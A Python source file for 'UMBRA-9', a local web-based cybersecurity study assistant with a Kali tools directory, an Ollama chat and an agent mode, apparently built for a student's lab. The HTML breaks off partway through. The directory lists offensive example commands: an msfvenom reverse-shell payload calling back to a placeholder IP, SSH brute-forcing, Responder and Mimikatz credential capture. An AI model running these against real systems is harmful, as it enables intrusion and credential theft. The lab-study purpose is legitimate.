#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UMBRA-9 - Kashif ka personal cyber assistant (WEB VERSION)
=============================
GO KALI style ka web interface: Tools Directory + Ready-made Sawal + AI Chat.
Tumhare laptop ke andar chalta hai (local). Free, private.
Sirf Python 3 chahiye - koi extra library nahi.

Chalana:
    python cyber_assistant_web.py
Phir browser khud khul jayega:  http://localhost:8080

Chat ke liye Ollama + model chahiye (SETUP-GUIDE.md dekho).
Tools Directory Ollama ke baghair bhi chalti hai.

Band karna: terminal mein Ctrl+C
"""

import datetime
import json
import os
import platform
import re
import subprocess
import sys
import threading
import webbrowser
import urllib.request
import urllib.error
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("CYBER_PORT", "8080"))
OLLAMA_URL = "http://localhost:11434/api/chat"
TAGS_URL = "http://localhost:11434/api/tags"
MODEL = os.environ.get("CYBER_MODEL", "llama3.2:3b")

SYSTEM_PROMPT = """You are "UMBRA-9", the personal cybersecurity teacher and lab assistant of Kashif, a final-year BS Cybersecurity student. He works in his OWN lab: his own Kali VM, his Windows laptop, CTF platforms, and university assignments. Assume every task is for his own lab, study, or authorized practice.

WHAT YOU DO:
- Ethical hacking and blue-team study help: Nmap, Wireshark, Burp Suite, Metasploit concepts, Linux, networking, SOC work, log analysis, CTFs.
- Exam and viva study: definitions, comparisons, short memorable explanations.
- Small safe scripts in Python/Bash with brief line-by-line explanation.

HOW YOU ANSWER:
- Simple, clear English. Short intro line, then the command or steps, then one "Remember:" line with a memory trick.
- ALWAYS explain what a command does and what its important flags mean. Never give a bare command.
- If a command can delete data, break a system, or hit a real network, warn clearly BEFORE it and suggest the safe lab alternative.
- Never invent flags, CVE numbers, or tool options. If unsure, say "I am not sure - verify this" instead of guessing.
- Keep answers focused. No long essays unless he asks for detail.
"""

# ---------------------------------------------------------------------------
# TOOLS DIRECTORY - Kali ke mashhoor tools, categories ke saath.
# "cmd" mein TARGET ka matlab hai: apni lab machine ka IP/address wahan likho.
# ---------------------------------------------------------------------------
TOOLS = [
    # Information Gathering
    {"name": "Nmap", "cat": "Information Gathering",
     "desc": "Network scanner: open ports, services aur OS ka pata lagata hai.",
     "cmd": "nmap -sV TARGET"},
    {"name": "Netdiscover", "cat": "Information Gathering",
     "desc": "Apne LAN mein live machines dhundta hai (ARP scan).",
     "cmd": "netdiscover -r 192.168.1.0/24"},
    {"name": "theHarvester", "cat": "Information Gathering",
     "desc": "Public sources se emails, subdomains aur hosts ki info (OSINT).",
     "cmd": "theHarvester -d example.com -b all"},
    {"name": "Recon-ng", "cat": "Information Gathering",
     "desc": "OSINT reconnaissance ka framework, modules ke saath.",
     "cmd": "recon-ng"},
    {"name": "Maltego", "cat": "Information Gathering",
     "desc": "Domains, IPs aur logon ke connections ki graph banata hai.",
     "cmd": "maltego"},
    {"name": "Sherlock", "cat": "Information Gathering",
     "desc": "Ek username ko 400+ websites par dhundta hai (OSINT).",
     "cmd": "sherlock username"},
    {"name": "DNSenum", "cat": "Information Gathering",
     "desc": "DNS records aur subdomains enumerate karta hai.",
     "cmd": "dnsenum example.com"},

    # Vulnerability Analysis
    {"name": "Nikto", "cat": "Vulnerability Analysis",
     "desc": "Web server scanner: purani files, galat settings, khatarnak cheezein.",
     "cmd": "nikto -h http://TARGET"},
    {"name": "OpenVAS (Greenbone)", "cat": "Vulnerability Analysis",
     "desc": "Full vulnerability scanner - bare networks ki mukammal report.",
     "cmd": "gvm-start"},
    {"name": "Lynis", "cat": "Vulnerability Analysis",
     "desc": "Apne hi Linux system ki security audit karta hai.",
     "cmd": "lynis audit system"},

    # Web Application Analysis
    {"name": "Burp Suite", "cat": "Web Application Analysis",
     "desc": "Browser aur website ke darmiyan traffic rok kar test karne wala proxy.",
     "cmd": "burpsuite"},
    {"name": "OWASP ZAP", "cat": "Web Application Analysis",
     "desc": "Web app scanner - Burp ka mashhoor free alternative.",
     "cmd": "zaproxy"},
    {"name": "Gobuster", "cat": "Web Application Analysis",
     "desc": "Website ki chhupi hui directories aur files dhundta hai.",
     "cmd": "gobuster dir -u http://TARGET -w wordlist.txt"},
    {"name": "WPScan", "cat": "Web Application Analysis",
     "desc": "WordPress sites ki kamzoriyan aur purane plugins check karta hai.",
     "cmd": "wpscan --url http://TARGET"},
    {"name": "WhatWeb", "cat": "Web Application Analysis",
     "desc": "Website kis technology par bani hai, pehchanta hai.",
     "cmd": "whatweb http://TARGET"},

    # Database Assessment
    {"name": "SQLMap", "cat": "Database Assessment",
     "desc": "SQL injection ko test aur automate karta hai.",
     "cmd": "sqlmap -u \"http://TARGET/page?id=1\" --dbs"},
    {"name": "SQLite Browser", "cat": "Database Assessment",
     "desc": "SQLite database files ko khol kar dekhna aur samajhna.",
     "cmd": "sqlitebrowser file.db"},

    # Password Attacks
    {"name": "Hydra", "cat": "Password Attacks",
     "desc": "Online password brute-force: SSH, FTP, web login waghera par (sirf apni lab mein).",
     "cmd": "hydra -l user -P wordlist.txt TARGET ssh"},
    {"name": "John the Ripper", "cat": "Password Attacks",
     "desc": "Offline password hash cracker.",
     "cmd": "john hashes.txt"},
    {"name": "Hashcat", "cat": "Password Attacks",
     "desc": "GPU ki taqat se tez tareen hash cracking.",
     "cmd": "hashcat -m 0 hash.txt wordlist.txt"},
    {"name": "Medusa", "cat": "Password Attacks",
     "desc": "Online brute-force tool, Hydra ki tarah ka.",
     "cmd": "medusa -h TARGET -u user -P wordlist.txt -M ssh"},
    {"name": "CeWL", "cat": "Password Attacks",
     "desc": "Kisi website ke alfaaz se custom wordlist banata hai.",
     "cmd": "cewl http://TARGET -w mywords.txt"},

    # Wireless Attacks
    {"name": "Aircrack-ng", "cat": "Wireless Attacks",
     "desc": "WiFi handshake pakar kar password crack karne wala suite (sirf apne router/lab par).",
     "cmd": "aircrack-ng capture.cap -w wordlist.txt"},
    {"name": "Wifite", "cat": "Wireless Attacks",
     "desc": "WiFi attacks ki automation - aircrack ko asaan banata hai.",
     "cmd": "wifite"},
    {"name": "Reaver", "cat": "Wireless Attacks",
     "desc": "Router ke WPS PIN par attack (purane routers par).",
     "cmd": "reaver -i wlan0mon -b BSSID -vv"},
    {"name": "Kismet", "cat": "Wireless Attacks",
     "desc": "Aas paas ke wireless networks ka detector aur sniffer.",
     "cmd": "kismet"},

    # Exploitation Tools
    {"name": "Metasploit Framework", "cat": "Exploitation Tools",
     "desc": "Exploits chalane ka sab se bara framework.",
     "cmd": "msfconsole"},
    {"name": "MSFvenom", "cat": "Exploitation Tools",
     "desc": "Metasploit ke liye payloads banata hai (sirf lab practice ke liye).",
     "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > shell.exe"},
    {"name": "SearchSploit", "cat": "Exploitation Tools",
     "desc": "Exploit-DB ko offline search karta hai.",
     "cmd": "searchsploit apache 2.4"},

    # Sniffing & Spoofing
    {"name": "Wireshark", "cat": "Sniffing & Spoofing",
     "desc": "Network packets ko pakar kar gehra analysis.",
     "cmd": "wireshark"},
    {"name": "Tcpdump", "cat": "Sniffing & Spoofing",
     "desc": "Terminal par packet capture - Wireshark ka halka version.",
     "cmd": "tcpdump -i eth0"},
    {"name": "Bettercap", "cat": "Sniffing & Spoofing",
     "desc": "Network attacks aur MITM ka framework (sirf lab mein).",
     "cmd": "bettercap -iface eth0"},
    {"name": "Responder", "cat": "Sniffing & Spoofing",
     "desc": "Windows networks mein name-poisoning se hashes pakarta hai (lab use).",
     "cmd": "responder -I eth0"},

    # Post Exploitation
    {"name": "Mimikatz", "cat": "Post Exploitation",
     "desc": "Windows memory se passwords aur hashes nikalta hai (lab use).",
     "cmd": "mimikatz.exe"},
    {"name": "BloodHound", "cat": "Post Exploitation",
     "desc": "Active Directory ke attack paths ki graph banata hai.",
     "cmd": "bloodhound"},
    {"name": "NetExec", "cat": "Post Exploitation",
     "desc": "Windows network pentest tool (purane CrackMapExec ka naya naam).",
     "cmd": "netexec smb TARGET -u user -p pass"},

    # Forensics
    {"name": "Autopsy", "cat": "Forensics",
     "desc": "Disk image ki forensic investigation - deleted files, history waghera.",
     "cmd": "autopsy"},
    {"name": "Volatility", "cat": "Forensics",
     "desc": "RAM (memory) dump ka analysis - chalti hui processes aur connections.",
     "cmd": "vol -f memory.raw windows.info"},
    {"name": "Binwalk", "cat": "Forensics",
     "desc": "Firmware/files ke andar chhupi hui files nikalta hai.",
     "cmd": "binwalk -e firmware.bin"},
    {"name": "Foremost", "cat": "Forensics",
     "desc": "Deleted files recover karta hai (file carving).",
     "cmd": "foremost -i disk.img"},

    # Doosri reel (GO KALI Tool Explorer) se mile extra tools
    {"name": "Shodan", "cat": "Information Gathering",
     "desc": "Internet se jude devices aur servers ko dhundne wala search engine (website + CLI).",
     "cmd": "shodan search \"apache\""},
    {"name": "TinEye", "cat": "Information Gathering",
     "desc": "Reverse image search - photo internet par kahan kahan hai aur sab se pehle kahan ayi thi.",
     "cmd": "tineye.com (photo upload karo ya photo ka URL do)"},
    {"name": "SpiderFoot", "cat": "Information Gathering",
     "desc": "OSINT automation - kisi domain/IP ki har public info khud jama karta hai.",
     "cmd": "spiderfoot"},
    {"name": "Sublist3r", "cat": "Information Gathering",
     "desc": "Kisi domain ke subdomains tezi se dhundta hai.",
     "cmd": "sublist3r -d example.com"},
    {"name": "Amass", "cat": "Information Gathering",
     "desc": "OWASP ka tool - subdomains aur network ki mapping (OSINT).",
     "cmd": "amass enum -d example.com"},
    {"name": "Nessus", "cat": "Vulnerability Analysis",
     "desc": "Duniya ka mashhoor vulnerability scanner (commercial hai - free Essentials version mehdood hai).",
     "cmd": "systemctl start nessusd  (phir browser: https://localhost:8834)"},
    {"name": "FFUF", "cat": "Web Application Analysis",
     "desc": "Bohat tez web fuzzer - chhupi directories, files aur parameters dhundta hai.",
     "cmd": "ffuf -u http://TARGET/FUZZ -w wordlist.txt"},
    {"name": "WFuzz", "cat": "Web Application Analysis",
     "desc": "Web application fuzzer - Gobuster/FFUF ki family ka.",
     "cmd": "wfuzz -w wordlist.txt http://TARGET/FUZZ"},
    {"name": "Ghidra", "cat": "Reverse Engineering",
     "desc": "NSA ka free reverse engineering tool - programs ko khol kar samajhna.",
     "cmd": "ghidra"},
    {"name": "Radare2", "cat": "Reverse Engineering",
     "desc": "Command-line reverse engineering framework - binary analysis.",
     "cmd": "r2 file.bin"},
    {"name": "Steghide", "cat": "Forensics",
     "desc": "Photos/audio files ke andar chhupa data nikalta hai (steganography).",
     "cmd": "steghide extract -sf image.jpg"},

    # Social Engineering
    {"name": "SET (Social-Engineer Toolkit)", "cat": "Social Engineering",
     "desc": "Social engineering attacks ki practice ke liye toolkit (sirf taleem/lab - asal logon par kabhi nahi).",
     "cmd": "setoolkit"},
    {"name": "BeEF", "cat": "Social Engineering",
     "desc": "Browser Exploitation Framework - browser ko test target banata hai (lab use).",
     "cmd": "beef-xss"},
]

CATEGORIES = []
for _t in TOOLS:
    if _t["cat"] not in CATEGORIES:
        CATEGORIES.append(_t["cat"])

SUGGESTED = [
    "How to use nmap for network scanning?",
    "SQL injection testing with sqlmap",
    "Web app scanning with nikto",
    "How does aircrack-ng crack a WiFi handshake?",
    "Explain the Hydra password tool with an example",
    "What is the difference between John and Hashcat?",
]

PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#0b0f14">
<meta name="mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-title" content="UMBRA-9">
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>&#127769;</text></svg>">
<title>UMBRA-9 — Kashif ka Personal Cyber Assistant</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #02070c; color: #d7e8de; font-family: 'Segoe UI', Arial, sans-serif;
         background-image: radial-gradient(900px 480px at 85% -10%, rgba(13,138,78,.20), transparent 60%),
                           radial-gradient(700px 420px at -10% 0%, rgba(52,211,153,.10), transparent 55%);
         background-attachment: fixed; }
  header { background: linear-gradient(120deg, #04120d 30%, #03130e 60%, #02100b);
           border-bottom: 1px solid #0c2b22; box-shadow: 0 1px 0 rgba(52,211,153,.25), 0 10px 30px rgba(0,0,0,.45);
           padding: 18px 22px; display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
  header .logo { font-size: 30px; filter: drop-shadow(0 0 8px rgba(52,211,153,.5)); }
  header h1 { font-size: 26px; letter-spacing: 3px; font-weight: 800;
              background: linear-gradient(180deg, #d9fff0, #34d399 70%, #0d8a4e);
              -webkit-background-clip: text; background-clip: text; color: transparent; }
  header p { color: #7d93a3; font-size: 13px; margin-top: 2px; }
  #status { margin-left: auto; font-size: 12.5px; padding: 6px 12px; border-radius: 20px;
            background: rgba(3,10,14,.9); border: 1px solid #134233; color: #9db8ac; }
  #status .dot { display: inline-block; width: 9px; height: 9px; border-radius: 50%; margin-right: 6px; background: #888; }
  #status.on .dot { background: #34d399; box-shadow: 0 0 8px #34d399; }
  #status.off .dot { background: #f87171; box-shadow: 0 0 8px #f87171; }
  .wrap { max-width: 1080px; margin: 0 auto; padding: 18px 16px 40px; }
  h2.sec { font-size: 15px; color: #34d399; margin: 24px 0 10px; letter-spacing: 1.5px;
           text-transform: uppercase; border-left: 3px solid #34d399; padding-left: 9px; }
  .chips { display: flex; flex-wrap: wrap; gap: 8px; }
  .chip { background: #030b10; border: 1px solid #1d5c46; color: #d9fff0; padding: 8px 13px;
          border-radius: 18px; cursor: pointer; font-size: 13.5px; }
  .chip:hover { background: rgba(52,211,153,.12); }
  .cats { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 12px; }
  .cat { background: #030b10; border: 1px solid #134233; color: #9db8ac; padding: 7px 12px;
         border-radius: 8px; cursor: pointer; font-size: 13px; }
  .cat.active { background: rgba(16,185,129,.16); color: #ffffff; border-color: #34d399; }
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 10px; }
  .card { background: rgba(3,10,14,.92); border: 1px solid #0c2b22; border-radius: 10px; padding: 13px 14px; cursor: pointer; }
  .card:hover { border-color: #34d399; box-shadow: 0 0 0 1px rgba(52,211,153,.25), 0 6px 18px rgba(0,0,0,.4); }
  .card h3 { font-size: 15px; color: #eafff5; margin-bottom: 5px; }
  .card .c { font-size: 11px; color: #34d399; text-transform: uppercase; letter-spacing: .6px; }
  .card p { font-size: 13px; color: #8fa8a0; margin-top: 5px; line-height: 1.45; }
  #detail { display: none; background: linear-gradient(120deg, #04120d, #02100b); border: 1px solid #1d5c46; border-radius: 10px;
            padding: 15px 17px; margin-top: 14px; }
  #detail h3 { color: #34d399; margin-bottom: 6px; }
  #detail p { font-size: 14px; line-height: 1.55; color: #d7e8de; }
  #detail code { display: block; background: #010507; color: #4ade80; border: 1px solid #0c2b22; padding: 10px 12px; border-radius: 8px;
                 margin: 10px 0; font-size: 13.5px; overflow-x: auto; white-space: nowrap; }
  #dguide { display: none; white-space: pre-wrap; background: #010507; border: 1px solid #0c2b22;
            border-radius: 8px; padding: 12px 14px; margin: 10px 0; font-size: 13.5px; line-height: 1.6; color: #b9d4c6; }
  #cbox { display: none; background: linear-gradient(120deg, #04120d, #02100b); border: 1px solid #1d5c46; border-radius: 10px;
          padding: 15px 17px; margin-top: 14px; }
  #cbox h3 { color: #34d399; margin-bottom: 8px; }
  #cbody { white-space: pre-wrap; font-size: 14px; line-height: 1.6; color: #d7e8de; }
  #agentbox { background: rgba(3,10,14,.92); border: 1px solid #5b4517; border-radius: 12px; padding: 14px; }
  .warn { background: rgba(251,191,36,.08); border: 1px solid #5b4517; color: #f2d38a; border-radius: 8px;
          padding: 10px 12px; font-size: 13px; line-height: 1.5; margin-bottom: 4px; }
  #agentbar, #amanual { display: flex; gap: 8px; margin-top: 10px; }
  #atask, #mcmd { flex: 1; background: #010507; border: 1px solid #134233; border-radius: 8px; color: #eafff5;
                  padding: 11px 13px; font-size: 14.5px; }
  #atask:focus, #mcmd:focus { outline: none; border-color: #34d399; box-shadow: 0 0 0 2px rgba(52,211,153,.18); }
  .autolabel { display: block; margin-top: 10px; font-size: 13px; color: #f2d38a; cursor: pointer; }
  #anotes { margin-top: 10px; font-size: 13.5px; color: #9db8ac; white-space: pre-wrap; }
  .step { background: rgba(3,10,14,.92); border: 1px solid #0c2b22; border-radius: 10px; padding: 12px 14px; margin-top: 10px; }
  .step code { display: block; background: #010507; color: #4ade80; border: 1px solid #0c2b22; padding: 9px 11px; border-radius: 8px;
               font-size: 13.5px; overflow-x: auto; white-space: nowrap; margin: 6px 0; }
  .step .why { font-size: 13px; color: #8fa8a0; }
  .step .srow { display: flex; gap: 8px; align-items: center; margin-top: 8px; flex-wrap: wrap; }
  .badge { font-size: 12px; padding: 3px 9px; border-radius: 12px; background: #030b10;
           border: 1px solid #134233; color: #9db8ac; }
  .badge.ok { border-color: #14532d; color: #34d399; background: rgba(52,211,153,.08); }
  .badge.bad { border-color: #5b1d24; color: #f87171; background: rgba(248,113,113,.08); }
  .outbox { background: #010507; color: #b9d4c6; border: 1px solid #0c2b22; border-radius: 8px;
            padding: 10px 12px; margin-top: 10px; font-size: 12.5px; max-height: 260px;
            overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
  .explain { background: #04120d; border: 1px solid #1d5c46; border-radius: 8px; padding: 10px 12px;
             margin-top: 10px; font-size: 13.5px; line-height: 1.55; white-space: pre-wrap; color: #d7e8de; }
  #scanbox { background: rgba(3,10,14,.92); border: 1px solid #1d5c46; border-radius: 12px; padding: 14px; }
  .scannote { font-size: 13.5px; color: #9db8ac; line-height: 1.55; margin-bottom: 12px; }
  #scansummary { margin: 12px 0 4px; display: flex; gap: 8px; flex-wrap: wrap; }
  .badge.warnb { border-color: #5b4517; color: #fbbf24; background: rgba(251,191,36,.08); }
  .finding { border-radius: 10px; padding: 11px 14px; margin-top: 9px; border: 1px solid #0c2b22; background: #030b10; }
  .finding p { font-size: 13px; color: #8fa8a0; margin-top: 4px; line-height: 1.5; }
  .finding.f-ok { border-left: 5px solid #34d399; }
  .finding.f-warn { border-left: 5px solid #fbbf24; }
  .finding.f-danger { border-left: 5px solid #f87171; background: rgba(248,113,113,.06); }
  #scanexplain { margin-top: 12px; }
  #alertbanner { display: none; border-radius: 10px; padding: 13px 15px; margin-bottom: 12px;
                 font-size: 14.5px; font-weight: 700; line-height: 1.5; }
  #alertbanner.danger { display: block; background: rgba(248,113,113,.10); border: 1px solid #f87171; color: #fca5a5; }
  #alertbanner.warn { display: block; background: rgba(251,191,36,.10); border: 1px solid #fbbf24; color: #fde68a; }
  .fixbtn { background: transparent; color: #f87171; border: 1px solid #7f1d1d; padding: 6px 12px;
            border-radius: 8px; cursor: pointer; font-size: 13px; margin: 8px 6px 0 0; }
  .fixbtn:hover { background: rgba(248,113,113,.10); }
  .fixbtn:disabled { opacity: .5; cursor: default; }
  .fixresult { font-size: 13px; margin-top: 8px; color: #9db8ac; white-space: pre-wrap; }
  #userbox { background: rgba(3,10,14,.92); border: 1px solid #134233; border-radius: 12px; padding: 14px; }
  #userbar { display: flex; gap: 8px; margin-top: 10px; }
  #userinp { flex: 1; background: #010507; border: 1px solid #134233; border-radius: 8px; color: #eafff5;
             padding: 11px 13px; font-size: 14.5px; }
  #userinp:focus { outline: none; border-color: #34d399; box-shadow: 0 0 0 2px rgba(52,211,153,.18); }
  #userresult { margin-top: 6px; }
  #userresult a { color: #34d399; word-break: break-all; }
  #ipbox { background: rgba(3,10,14,.92); border: 1px solid #134233; border-radius: 12px; padding: 14px; }
  #ipbar { display: flex; gap: 8px; margin-top: 10px; }
  #ipinp { flex: 1; background: #010507; border: 1px solid #134233; border-radius: 8px; color: #eafff5;
           padding: 11px 13px; font-size: 14.5px; }
  #ipinp:focus { outline: none; border-color: #34d399; box-shadow: 0 0 0 2px rgba(52,211,153,.18); }
  #ipresult { margin-top: 6px; }
  #netbox { background: rgba(3,10,14,.92); border: 1px solid #134233; border-radius: 12px; padding: 14px; }
  #netresults { margin-top: 6px; }
  .btn { background: linear-gradient(180deg, #34d399, #0d8a4e); color: #04120d; border: none; padding: 9px 16px; border-radius: 8px;
         font-weight: 700; cursor: pointer; font-size: 14px; box-shadow: 0 4px 14px rgba(13,138,78,.35); }
  .btn:hover { background: linear-gradient(180deg, #4ade80, #0d8a4e); }
  #chatbox { background: rgba(3,10,14,.92); border: 1px solid #0c2b22; border-radius: 12px; overflow: hidden; }
  #msgs { height: 340px; overflow-y: auto; padding: 14px; display: flex; flex-direction: column; gap: 10px; }
  .msg { max-width: 85%; padding: 10px 13px; border-radius: 12px; font-size: 14px; line-height: 1.55;
         white-space: pre-wrap; word-wrap: break-word; }
  .msg.user { align-self: flex-end; background: #0e3a2c; color: #eafff5; border: 1px solid #1d5c46; border-bottom-right-radius: 3px; }
  .msg.ai { align-self: flex-start; background: #030b10; border: 1px solid #0c2b22; color: #d7e8de; border-bottom-left-radius: 3px; }
  .msg.ai code { background: #010507; color: #4ade80; padding: 1px 5px; border-radius: 4px; font-size: 13px; }
  #chatbar { display: flex; gap: 8px; padding: 11px; border-top: 1px solid #0c2b22; background: #02070c; }
  #inp { flex: 1; background: #010507; border: 1px solid #134233; border-radius: 8px; color: #eafff5;
         padding: 11px 13px; font-size: 14.5px; }
  #inp:focus { outline: none; border-color: #34d399; box-shadow: 0 0 0 2px rgba(52,211,153,.18); }
  footer { text-align: center; color: #5f7a70; font-size: 12px; padding: 8px 0 22px; }

  .shell { display: flex; align-items: stretch; max-width: 1280px; margin: 0 auto; }
  .sidebar { width: 200px; flex: none; background: #030b10; border-right: 1px solid #0c2b22; padding: 16px 10px; }
  .snav a { display: block; padding: 10px 12px; margin-bottom: 4px; border-radius: 8px; color: #9db8ac; cursor: pointer; font-size: 14px; border-left: 3px solid transparent; }
  .snav a:hover { background: rgba(52,211,153,.07); color: #eafff5; }
  .snav a.on { background: rgba(16,185,129,.14); color: #ffffff; border-left-color: #34d399; }
  .sidefoot { margin-top: 18px; font-size: 11.5px; color: #5f7a70; line-height: 1.6; padding: 0 6px; }
  .main { flex: 1; min-width: 0; padding: 18px 18px 40px; }
  .hero { background: linear-gradient(120deg,#04120d 30%,#03130e 60%,#02100b); border: 1px solid #0c2b22; border-radius: 14px; padding: 22px; margin-bottom: 8px; box-shadow: inset 0 0 60px rgba(13,138,78,.08); }
  .hero-t { font-size: 40px; font-weight: 800; letter-spacing: 4px; background: linear-gradient(180deg,#d9fff0,#34d399 70%,#0d8a4e); -webkit-background-clip: text; background-clip: text; color: transparent; }
  .hero-s { color: #7d93a3; letter-spacing: 2px; font-size: 12.5px; margin-top: 4px; }
  .hero-pills { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 14px; }
  .threat-pill { display: inline-flex; align-items: center; gap: 7px; font-size: 12px; padding: 5px 11px; border-radius: 999px; border: 1px solid; letter-spacing: .5px; }
  .threat-pill i { width: 8px; height: 8px; border-radius: 50%; background: currentColor; box-shadow: 0 0 8px currentColor; }
  .tp-high { color: #f87171; border-color: #5b1d24; background: rgba(248,113,113,.08); }
  .tp-guarded { color: #fbbf24; border-color: #5b4517; background: rgba(251,191,36,.08); }
  .tp-low { color: #34d399; border-color: #14532d; background: rgba(52,211,153,.08); }
  .view { display: none; }
  .view.on { display: block; }
  @media (max-width: 760px) { .shell { flex-direction: column; } .sidebar { width: auto; border-right: none; border-bottom: 1px solid #0c2b22; } .snav { display: flex; flex-wrap: wrap; gap: 4px; } .snav a { margin-bottom: 0; } .sidefoot { display: none; } .hero-t { font-size: 30px; } }

  .hero { position: relative; overflow: hidden; }
  body::after { content: ''; position: fixed; inset: 0; pointer-events: none; z-index: 999;
                background: repeating-linear-gradient(0deg, rgba(255,255,255,.016) 0 1px, transparent 1px 3px); }
  .radar { position: absolute; right: 22px; top: 50%; transform: translateY(-50%); width: 118px; height: 118px;
           border-radius: 50%; border: 1px solid #1d5c46; overflow: hidden;
           background: repeating-radial-gradient(circle, transparent 0 27px, rgba(52,211,153,.16) 27px 28px); }
  .radar::before { content: ''; position: absolute; inset: 0; border-radius: 50%;
                   background: conic-gradient(from 0deg, rgba(52,211,153,.55), transparent 60deg);
                   animation: sweep 3.2s linear infinite; }
  @keyframes sweep { to { transform: rotate(360deg); } }
  .blip { position: absolute; width: 7px; height: 7px; border-radius: 50%; background: #f87171;
          box-shadow: 0 0 10px #f87171; animation: blink 1.7s ease-in-out infinite; }
  .blip.b1 { left: 30px; top: 38px; } .blip.b2 { left: 74px; top: 66px; animation-delay: .5s; }
  .blip.b3 { left: 56px; top: 24px; animation-delay: 1s; background: #fbbf24; box-shadow: 0 0 10px #fbbf24; }
  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: .25; } }
  #clock { color: #34d399; font-family: Consolas, monospace; }
  @media (max-width: 760px) { .radar { display: none; } }
</style>
</head>
<body>
<header>
  <div class="logo">&#128737;</div>
  <div>
    <h1>UMBRA-9</h1>
    <p>The deepest shadow &mdash; Kashif's personal cyber assistant (local &amp; free)</p>
  </div>
  <div id="status"><span class="dot"></span><span id="statustext">Checking AI status...</span></div>
</header>

<div class="shell">
  <nav class="sidebar">
    <div class="snav">
      <a data-view="chat" class="on">&#128172; AI Chat</a>
      <a data-view="agent">&#129302; Agent Mode</a>
      <a data-view="scan">&#128737; Device Scan</a>
      <a data-view="net">&#128246; Network Test</a>
      <a data-view="tools">&#128736; Tools (53)</a>
      <a data-view="concepts">&#128218; Concepts</a>
      <a data-view="osint">&#128269; OSINT</a>
    </div>
    <div class="sidefoot">UMBRA-9 &bull; Local<br>Data never leaves this laptop</div>
  </nav>
  <main class="main">
    <section class="hero">
      <div class="radar"><span class="blip b1"></span><span class="blip b2"></span><span class="blip b3"></span></div>
      <div class="hero-t">UMBRA-9</div>
      <div class="hero-s">PERSONAL CYBER ASSISTANT &mdash; KASHIF &mdash; <span id="clock">--:--:--</span></div>
      <div class="hero-pills">
        <span class="threat-pill tp-low"><i></i>PERSONAL &mdash; ONLY YOURS</span>
        <span class="threat-pill tp-guarded"><i></i>PASSWORD LOCKED</span>
        <span class="threat-pill tp-low"><i></i>LOCAL &mdash; DATA NEVER LEAVES</span>
      </div>
    </section>
  <div class="view on" id="view-chat">
  <h2 class="sec">&#9889; READY-MADE QUESTIONS (click one)</h2>
  <div class="chips" id="chips"></div>

  <h2 class="sec">&#128172; AI CHAT</h2>
  <div id="chatbox">
    <div id="msgs"></div>
    <div id="chatbar">
      <input id="inp" placeholder="Message UMBRA-9..." autocomplete="off">
      <button class="btn" id="send">Send</button>
    </div>
  </div>
  </div>

  <div class="view" id="view-agent">
  <h2 class="sec">&#129302; AGENT MODE - Say it, and it does it</h2>
  <div id="agentbox">
    <div class="warn">&#9888;&#65039; Agent Mode runs <b>REAL commands</b> on this machine. Use it ONLY on your own lab / CTF machines. Read every command before it runs - the AI can sometimes suggest a wrong one. Dangerous commands are blocked by the system itself.</div>
    <div id="agentbar">
      <input id="atask" placeholder="Type a task - e.g.: check the open ports on this machine" autocomplete="off">
      <button class="btn" id="aplan">Make Plan</button>
    </div>
    <label class="autolabel"><input type="checkbox" id="aauto"> Auto Mode - run all planned commands one after another without asking (lab only!)</label>
    <div id="anotes"></div>
    <div id="asteps"></div>
    <div id="amanual">
      <input id="mcmd" placeholder="Or type a command yourself - e.g.: ipconfig / whoami / ip a" autocomplete="off">
      <button class="btn" id="mrun">Run</button>
    </div>
    <pre id="mout" class="outbox" style="display:none"></pre>
  </div>
  </div>

  <div class="view" id="view-scan">
  <h2 class="sec">&#128737; DEVICE SCAN - Virus / Malware Check</h2>
  <div id="scanbox">
    <div id="alertbanner"></div>
    <p class="scannote">One-click full device security check: Defender, firewall, startup programs, processes running from odd places, internet connections, the hosts file, and new executable files. <b>The scan only LOOKS - delete/remove happens ONLY on your order, and every action asks for your confirmation first.</b> Some checks can take 10-30 seconds.</p>
    <button class="btn" id="scanbtn">Scan Now</button>
    <div id="scansummary"></div>
    <div id="scanresults"></div>
    <button class="btn" id="scanexplain" style="display:none">Explain everything with AI</button>
    <div id="scanaitxt" class="explain" style="display:none"></div>
  </div>
  </div>

  <div class="view" id="view-net">
  <h2 class="sec">&#128246; MY NETWORK TEST - WiFi + Camera</h2>
  <div id="netbox">
    <p class="scannote">Your <b>own</b> network: WiFi encryption, the strength of your own saved WiFi password (the password is never shown here), the router's open ports, devices present on the network, and devices with camera-type ports. <b>Read-only - it changes nothing.</b></p>
    <button class="btn" id="netbtn">Run Network Test</button>
    <div id="netresults"></div>
  </div>
  </div>

  <div class="view" id="view-tools">
  <h2 class="sec">&#128736; TOOLS BY CATEGORY</h2>
  <div class="cats" id="cats"></div>
  <div class="grid" id="grid"></div>
  <div id="detail">
    <h3 id="dname"></h3>
    <p id="ddesc"></p>
    <code id="dcmd"></code>
    <div id="dguide"></div>
    <button class="btn" id="dask">Ask the AI about this tool</button>
  </div>
  </div>

  <div class="view" id="view-concepts">
  <h2 class="sec">&#128218; KNOWLEDGE / CONCEPTS</h2>
  <div class="grid" id="cgrid"></div>
  <div id="cbox"><h3 id="ctitle"></h3><div id="cbody"></div></div>
  </div>

  <div class="view" id="view-osint">
  <h2 class="sec">&#128205; IP LOCATION LOOKUP (OSINT)</h2>
  <div id="ipbox">
    <p class="scannote">See any <b>IP address</b> 's city/area and internet company (ISP) - a core OSINT skill. <b>Reality:</b> An IP reveals only the city level - never a home address or live location. Leave it empty to look up <b>your own IP</b> and see: this is exactly what every website sees about you.</p>
    <div id="ipbar">
